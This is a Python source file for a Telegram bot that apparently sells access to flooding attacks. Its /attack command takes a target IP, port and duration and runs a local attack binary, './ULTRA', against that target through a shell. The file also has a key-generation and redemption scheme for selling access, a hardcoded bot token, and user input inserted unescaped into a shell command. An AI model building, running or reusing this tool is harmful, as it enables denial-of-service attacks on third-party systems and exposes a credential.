import os
import asyncio
import secrets  # For generating secure random keys
import time  # For tracking redemption time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

# Replace with your new bot token from BotFather
TELEGRAM_BOT_TOKEN = '7718765612:AAEsrz7uXxsq_aDoPjncPdOD73z3WLOEVz0'
ALLOWED_USER_ID = 6135948216  # Admin user ID
bot_access_free = True  

# In-memory storage for the generated key and redemption status
generated_key = None
key_redeemed = False
redeem_time = None  # Timestamp of key redemption

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def genkey(update: Update, context: CallbackContext):
    global generated_key  # Reference the global generated_key variable

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is the admin
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Generate a secure random key
    generated_key = secrets.token_urlsafe(16)  # Generates a 16-byte secure token (alphanumeric)
    
    # Reset redemption status and time
    global key_redeemed, redeem_time
    key_redeemed = False
    redeem_time = None  # Reset the redemption time

    # Send the generated key to the admin
    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Your generated key: {generated_key}*", parse_mode='Markdown')

async def redeem(update: Update, context: CallbackContext):
    global generated_key, key_redeemed, redeem_time  # Reference the global variables

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user redeeming the key

    # Ensure the key exists and has not already been redeemed
    if not generated_key:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')
        return

    if key_redeemed:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ The key has already been redeemed!*", parse_mode='Markdown')
        return

    # Redeem the key
    key_redeemed = True
    redeem_time = time.time()  # Store the redemption time

    await context.bot.send_message(chat_id=chat_id, text=f"*🔑 Key redeemed successfully!* Your key: {generated_key}", parse_mode='Markdown')

async def status(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user requesting the status

    # Check if the user is authorized to view the status
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    # Show current status of key and redemption
    if not generated_key:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No key has been generated yet!*", parse_mode='Markdown')
    else:
        redemption_status = "Redeemed" if key_redeemed else "Not redeemed"
        redeem_time_msg = (
            f"\n*⌛ Redeemed at: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(redeem_time))}*" 
            if key_redeemed else ""
        )
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*🔑 Current Key: {generated_key}*\n"
                f"*Status: {redemption_status}*"
                f"{redeem_time_msg}"
            ),
            parse_mode='Markdown'
        )

async def stop(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user requesting the stop command

    # Only allow the admin to stop the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this command!*", parse_mode='Markdown')
        return

    await context.bot.send_message(chat_id=chat_id, text="*🛑 Bot is stopping...*")
    # You can stop the bot by calling shutdown or using Application.stop()
    await context.application.stop()

def main():
    """Start the bot and set up the handlers."""
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("stop", stop))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
